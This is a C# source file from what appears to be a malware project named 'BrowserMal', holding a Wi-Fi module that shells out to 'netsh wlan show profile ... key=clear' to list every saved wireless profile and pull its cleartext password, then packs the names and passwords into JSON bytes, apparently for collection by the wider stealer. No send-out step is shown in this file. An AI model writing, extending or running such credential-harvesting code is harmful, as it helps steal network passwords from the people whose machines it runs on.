using BrowserMal.Util;
using Newtonsoft.Json;
using System.Collections.Generic;
using System.Text;
using System.Text.RegularExpressions;

namespace BrowserMal.Wifi
{
    public class Enumerate
    {

        public byte[] Start()
        {
            List<string> wifiNames = new List<string>();
            List<string> wifiProfiles = ProcessUtil.ProcessInvoker("cmd.exe", "/c netsh wlan show profile", true, true);

            foreach (string s in wifiProfiles)
            {
                Match m = Regex.Match(s, "    All User Profile     : (.*)$");

                if (m.Success)
                    wifiNames.Add(m.Groups[1].Value);
            }
            List<WifiCredential> wifiCredentials = GetCredentials(wifiNames);
            string json = JsonConvert.SerializeObject(wifiCredentials, Formatting.Indented);

            return Encoding.UTF8.GetBytes(json);
        }

        private List<WifiCredential> GetCredentials(List<string> wifiNames)
        {
            List<WifiCredential> credentials = new List<WifiCredential>();

            foreach (string wifi in wifiNames)
            {
                string utf8WifiName = ProcessUtil.ConvertToUTF8(wifi);

                List<string> wifiOutput = ProcessUtil.ProcessInvoker("cmd.exe", $"/c netsh wlan show profile name=\"{utf8WifiName}\" key=clear", true, true);
                bool hasPassword = false;

                foreach (string line in wifiOutput)
                {
                    Match m = Regex.Match(line, "    Key Content            : (.*)$");

                    if (m.Success)
                    {
                        credentials.Add(new WifiCredential(utf8WifiName, m.Groups[1].Value));
                        hasPassword = true;

                        continue;
                    }
                }

                if (!hasPassword)
                    credentials.Add(new WifiCredential(utf8WifiName, "NO PASSWORD"));
            }

            return credentials;
        }
    }

    internal class WifiCredential
    {
        public string Ssid { get; set; }
        public string Password { get; set; }

        public WifiCredential(string ssid, string password)
        {
            this.Ssid = ssid;
            this.Password = password;
        }
    }
}
